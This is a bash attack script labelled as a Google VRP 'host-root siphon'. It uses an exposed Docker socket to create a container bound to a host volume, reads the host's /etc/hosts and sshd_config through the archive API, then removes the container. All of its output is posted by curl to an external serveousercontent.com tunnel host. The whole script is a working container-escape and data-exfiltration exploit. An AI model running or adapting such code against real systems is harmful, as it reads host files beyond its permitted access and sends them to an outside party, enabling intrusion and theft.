#!/bin/bash
URL="1cb5413e91fecf51-103-95-173-85.serveousercontent.com"

{
  echo "=== [!] GOOGLE VRP: FINAL HOST-ROOT SIPHON ==="
  
  # Use the image you confirmed exists in Section [3]
  IMG="sha256:25109184c71bdad752c8312a8623239686a9a2071e8825f20acb8f2198c3f659"

  # 1. Create a dummy container to act as a 'Bridge' to the volume
  ID=$(curl -s -X POST --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d "{\"Image\": \"$IMG\", \"HostConfig\": {\"Binds\": [\"p0_root:/host_data:ro\"]}}" \
    http://localhost/containers/create | grep -oE '"Id":"[a-f0-9]+"' | cut -d'"' -f4)

  if [ -n "$ID" ]; then
    echo "[+] Bridge Container ID: $ID"
    
    echo "--- [!] HOST'S ACTUAL /ETC/HOSTS FILE ---"
    # We siphon the data through the socket Archive API
    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host_data/etc/hosts" | tar -xO
    
    echo -e "\n--- [!] HOST'S SSH CONFIG BANNER ---"
    # Testing the SSH version via the file system
    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host_data/etc/ssh/sshd_config" | tar -xO | grep -E "Port|AddressFamily"

    # Cleanup
    curl -s -X DELETE --unix-socket /var/run/docker.sock "http://localhost/containers/$ID?force=true" > /dev/null
  fi
} | curl -s -X POST --data-binary @- "https://$URL"
